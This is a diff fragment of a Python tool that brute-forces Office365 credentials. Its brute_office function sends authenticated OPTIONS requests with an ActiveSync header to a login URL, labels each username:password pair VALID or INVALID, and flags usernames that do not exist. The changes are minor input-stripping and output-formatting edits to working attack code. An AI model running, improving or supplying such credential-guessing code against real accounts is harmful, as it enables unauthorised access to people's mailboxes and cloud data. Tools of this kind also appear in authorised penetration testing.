@@ -87,10 +87,11 @@ def banner():
 
 # Bruteforcing for userdetails
 def brute_office(username, password, check_user):
+    username = username.strip()
+    password = password.strip()
     try:
         if(check_user == None):
-            print(
-                Fore.RED+"[+] Error! Target does not seem to be using Office365")
+            print(Fore.RED+"[+] Error! Target does not seem to be using Office365")
         elif (check_user == True):
             # TODO: run bruter
             header = {"MS-ASProtocolVersion": "14.0"
@@ -103,11 +104,11 @@ def brute_office(username, password, check_user):
                             }
             r = requests.options(LOGIN_URL, headers=header,
                                  auth=(username, password), timeout=300)
-
+            
             color = Fore.GREEN+"VALID" if r.status_code == 200 else Fore.RED+"INVALID"
-            print("[{}]{}:{}".format(color, username,password, STATUS_CODES[str(r.status_code)]))
+            print("["+color+"]", "{}:{} - {}".format(username,password, STATUS_CODES[str(r.status_code)]))
         elif(check_user == False):
-            print(Fore.RED+"[+] Error! Invalid username: {}".format(username))
+            print(Fore.RED+"[+] Error! Username does not exist: {}".format(username))
         else:
             print(Fore.RED+"[+] Error! Unknown Error")
             sys.exit(0)
